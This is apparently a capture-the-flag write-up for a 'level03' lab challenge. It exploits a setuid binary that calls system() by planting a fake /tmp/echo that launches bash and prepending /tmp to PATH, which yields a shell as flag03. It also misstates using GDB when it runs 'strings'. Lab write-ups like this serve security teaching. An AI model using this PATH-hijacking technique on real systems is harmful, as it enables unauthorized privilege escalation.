### Vulnerability Assessment

Upon accessing the home directory, an executable file is discovered. Executing it yields a simple message:

```bash
$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
$ ./level03
Exploit me
```

The executable has setuid permissions, indicated by `rws`, allowing it to run with the privileges of its owner, which in this case is `flag03`.

### Exploitation

The GNU Debugger (GDB) is utilized to inspect the executable:

```bash
> strings level03
```

The code reveals important functions like `getegid`, `geteuid`, `setresgid`, `setresuid`, and `system`. The program sets its real, effective, and saved user and group IDs to those returned by `geteuid` and `getegid`, and then calls `system`.

The use of `system` here is critical. If the executable is vulnerable to command injection, it can execute arbitrary commands with the privileges of the `flag03` user.

To exploit this vulnerability:

1. A fake `echo` command is created, which is actually a bash shell script.
2. The PATH environment variable is modified to ensure that the fake `echo` command is found before the real one.
3. The vulnerable executable is run, which now executes the fake `echo` command, giving a bash shell with the privileges of the `flag03` user.

```bash
level03 $ echo "/bin/bash" > /tmp/echo
level03 $ chmod 777 /tmp/echo && export PATH=/tmp:$PATH
level03 $ ./level03
flag03 $ getflag
